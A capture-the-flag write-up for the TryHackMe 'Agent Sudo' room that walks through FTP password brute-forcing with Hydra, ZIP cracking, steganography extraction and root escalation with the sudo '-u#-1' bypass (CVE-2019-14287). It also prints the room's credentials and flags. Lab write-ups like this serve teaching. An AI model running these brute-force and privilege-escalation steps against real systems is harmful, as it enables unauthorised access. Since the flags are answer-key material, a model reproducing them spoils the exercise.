# TryHackMe — Agent Sudo

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-FTP%20%7C%20Steganography%20%7C%20Privilege%20Escalation-blue)
![OS](https://img.shields.io/badge/Target-Ubuntu-orange)

## Overview

This write-up documents the **Agent Sudo** TryHackMe room using the screenshots provided in the ZIP archive.

The investigation starts with service enumeration, discovers an FTP account through a password brute-force exercise, and uses clues in the website and FTP files to recover the SSH password for `james`. The privilege-escalation step abuses a vulnerable sudo version/configuration that allows `sudo -u#-1` to bypass a `!root` restriction.

## Attack chain

``` text
Nmap enumeration
      |
      v
Web page hints at User-Agent / agent codename
      |
      v
FTP password discovery: chris / crystal
      |
      v
Download FTP files and inspect clues
      |
      v
Extract hidden ZIP from cutie.png
      |
      v
Crack ZIP password: alien
      |
      v
Decode codename -> Area51
      |
      v
Use steghide on cute-alien.jpg
      |
      v
Recover James's password: hackerrules
      |
      v
SSH as james -> user flag
      |
      v
sudo -l: (ALL, !root) /bin/bash
      |
      v
sudo -u#-1 /bin/bash -> root flag
```

## 1. Scan the target

Run a service/version scan:

``` bash
nmap -sV <TARGET_IP>
```

The screenshot identifies these services:

        Port Service   Finding
  ---------- --------- -------------------------------
    `21/tcp` FTP       vsftpd 3.0.3
    `22/tcp` SSH       OpenSSH 7.6p1 on Ubuntu
    `80/tcp` HTTP      Apache httpd 2.4.29 on Ubuntu

<img width="787" height="227" alt="1" src="https://github.com/user-attachments/assets/1afd4f9e-8f65-4126-b5bb-6bded7ba5a0a" />

## 2. Inspect the website

Open the target in a browser:

``` text
http://<TARGET_IP>/
```

The page contains an announcement telling agents to use their own codename as the `User-Agent` to access the site.

<img width="626" height="264" alt="2" src="https://github.com/user-attachments/assets/6ca232c7-4671-4117-8924-e2e8658d6b0e" />

Use a web proxy such as Burp Suite to inspect the HTTP request and response. The screenshots show the announcement response and a request to `/agent_C_attention.php`.

<img width="626" height="397" alt="3" src="https://github.com/user-attachments/assets/ca934d70-993f-49f6-8a17-ab9275ed3461" />
<img width="615" height="454" alt="4" src="https://github.com/user-attachments/assets/52fc67bd-3eb9-4e8a-a554-e9834466da84" />
<img width="612" height="464" alt="5" src="https://github.com/user-attachments/assets/dc19d7fc-df35-452f-ac55-f5d6a9edf4d5" />


The message on the attention page says that Chris should tell Agent J about the information and change his weak password.

## 3. Discover the FTP password

Use Hydra with the `rockyou.txt` wordlist to test the FTP account
mentioned in the page:

``` bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

The recorded output finds these credentials:

``` text
Username: chris
Password: crystal
```

<img width="1273" height="189" alt="6" src="https://github.com/user-attachments/assets/89a8e670-2111-4bf2-85b8-77311ef97163" />

Connect to FTP:

``` bash
ftp <TARGET_IP>
```

Log in as `chris` with the recovered password.

<img width="375" height="193" alt="7" src="https://github.com/user-attachments/assets/6b45388e-fbd6-416d-b837-c21483d35570" />

List the files available on the FTP server:

``` text
ls
```

The directory contains:

-   `To_agentJ.txt`
-   `cute-alien.jpg`
-   `cutie.png`

Download the text file:

``` text
get To_agentJ.txt
```

<img width="619" height="250" alt="8" src="https://github.com/user-attachments/assets/d5a4242e-cd25-4a09-8299-66b189056320" />

Read the note:

``` bash
cat To_agentJ.txt
```

It says that the alien-like pictures are fake and that Agent J's password is stored in a fake picture.

<img width="1274" height="163" alt="9" src="https://github.com/user-attachments/assets/1e67c63e-b712-4bdf-bf85-99fac6abb31d" />

## 4. Retrieve and inspect `cutie.png`

Download the PNG from FTP:

``` text
get cutie.png
```

<img width="515" height="123" alt="10" src="https://github.com/user-attachments/assets/beab7d2d-f8da-4580-b5bb-1f759ea34721" />

The screenshots show an attempt to read the file as text, which produces binary-looking output. Instead, inspect the file type and embedded data.

``` bash
binwalk cutie.png
binwalk -e cutie.png
```

The output identifies an embedded ZIP archive named `8702.zip`.

<img width="218" height="64" alt="11-1" src="https://github.com/user-attachments/assets/5711c8e4-8d51-4d9c-af67-f39e39f02196" />
<img width="228" height="67" alt="11-2" src="https://github.com/user-attachments/assets/6b7b8fae-82c1-4721-b92c-1cc3815eb21a" />
<img width="996" height="168" alt="11-3" src="https://github.com/user-attachments/assets/8bc0ef0d-b5c5-4838-ad7c-02116efbf351" />
<img width="1281" height="292" alt="12" src="https://github.com/user-attachments/assets/563130ce-edf8-428e-a4d6-3823f2d8538c" />




Move into the extracted directory and list the files:

``` bash
cd _cutie.png.extracted
ls
```

<img width="460" height="113" alt="13" src="https://github.com/user-attachments/assets/c21e6ba2-3ccb-46d6-bfc3-12b09cf79ef6" />

## 5. Crack the embedded ZIP password

Use `zip2john` to convert the ZIP password hash into a format John the
Ripper can test:

``` bash
zip2john 8702.zip > name.txt
john name.txt
```

The screenshot shows the ZIP password recovered as:

``` text
alien
```

<img width="730" height="291" alt="14" src="https://github.com/user-attachments/assets/631b823c-792f-4c36-8465-4beddc003640" />

Extract the archive using the password:

``` bash
7z x 8702.zip
```

Enter `alien` when prompted. If the archive asks whether to overwrite an existing empty file, follow the prompt appropriate to your current extraction state.

<img width="614" height="595" alt="15" src="https://github.com/user-attachments/assets/87de351a-7a4c-4a1b-ab55-d308bf64caa2" />

Read the extracted message:

``` bash
cat To_agentR.txt
```

The message says:

``` text
Agent C,

We need to send the picture to ‘QxJlYTUx’ as soon as possible!

By,
Agent R
```

<img width="552" height="138" alt="16" src="https://github.com/user-attachments/assets/db8a0163-4ead-4185-90c6-98f741a417fe" />

Decode the Base64-looking string:

``` bash
echo 'QXJlYTUx' | base64 --decode
```

The screenshot's actual command/output indicates the decoded value is:

``` text
Area51
```

<img width="439" height="59" alt="17" src="https://github.com/user-attachments/assets/d5197e12-e8e8-4b56-87be-63d409e68a58" />

This value is used as the passphrase for the next image. If you retype the command, use the exact string visible in your own extracted note; Base64 strings are case-sensitive.

## 6. Retrieve and inspect `cute-alien.jpg`

Return to the FTP session and download the second image:

``` text
get cute-alien.jpg
```

<img width="400" height="121" alt="18" src="https://github.com/user-attachments/assets/f8d72af1-f4b0-4510-8544-0a1524518748" />

Use `steghide` to extract embedded data:

``` bash
steghide extract -sf cute-alien.jpg
```

When prompted, enter the passphrase discovered in the previous step (`Area51`). The tool writes the extracted content to `message.txt`.

<img width="872" height="162" alt="20" src="https://github.com/user-attachments/assets/6471f3ab-a151-48a9-90d3-4934cf72d881" />

Read the message:

``` bash
cat message.txt
```

It reveals James's login password:

``` text
hackerrules
```

<img width="704" height="170" alt="21" src="https://github.com/user-attachments/assets/eb6d18f6-d897-4baa-82e9-1cf0b39eea99" />

## 7. SSH as `james` and read the user flag

Connect using the recovered credentials:

``` bash
ssh james@<TARGET_IP>
```

Password:

``` text
hackerrules
```

<img width="649" height="574" alt="22" src="https://github.com/user-attachments/assets/00226ef9-99a1-42d6-ba77-b0230d4fd3f4" />

List the home directory and read the user flag:

``` bash
ls
cat user_flag.txt
```

The screenshot shows:

``` text
b03d9758e92a7c04146cfa7a5a313c7
```

<img width="346" height="105" alt="23" src="https://github.com/user-attachments/assets/d18037ea-8900-4d59-b47d-5bc478fd72f0" />

## 8. Inspect the web directory and sudo permissions

The screenshots show a simple HTTP server started from James's home
directory:

``` bash
python3 -m http.server
```

<img width="639" height="40" alt="24" src="https://github.com/user-attachments/assets/61da9fc7-a1e6-41bb-acab-0c5273d23411" />

Browsing to the server shows a directory listing containing files such as `.bash_history`, `.bash_logout`, `.bashrc`, `.profile`, `Alien_autospy.jpg`, and `user_flag.txt`.

<img width="662" height="394" alt="25" src="https://github.com/user-attachments/assets/4fe412af-aff0-48a2-9823-ed0ec8ce40d7" />

Check the sudo rules for `james`:

``` bash
sudo -l
```

The output shows:

``` text
(ALL, !root) /bin/bash
```

This rule appears to prohibit running Bash as root, but the vulnerable sudo behavior in the lab allows a numeric user ID of `-1` to bypass the restriction.

<img width="937" height="121" alt="26" src="https://github.com/user-attachments/assets/c42274f5-3a85-47c5-b880-0d0166f5bcba" />

## 9. Escalate privileges with the sudo user-ID bypass

Run the command shown in the screenshot:

``` bash
sudo -u#-1 /bin/bash
```

Then verify the effective identity:

``` bash
id
```

<img width="409" height="56" alt="27" src="https://github.com/user-attachments/assets/ccb6225f-888b-4e13-9fdf-a0d349cf558e" />

This technique is associated with **CVE-2019-14287**, which affects certain sudo versions when a sudoers rule uses a user-ID restriction such as `!root`. It is not a general-purpose sudo bypass; it depends on the vulnerable version and matching sudoers configuration.

## 10. Read the root flag

From the root shell, read the flag:

``` bash
cat /root/root.txt
```

The screenshot shows the root flag:

``` text
b53a02f55b57d4439e3341834d70c062
```

<img width="909" height="176" alt="28" src="https://github.com/user-attachments/assets/9f778dc6-3434-4885-a4e1-45557e114f7c" />

## Flags

  
  User   `b03d9758e92a7c04146cfa7a5a313c7`  
  Root   `b53a02f55b57d4439e3341834d70c062`
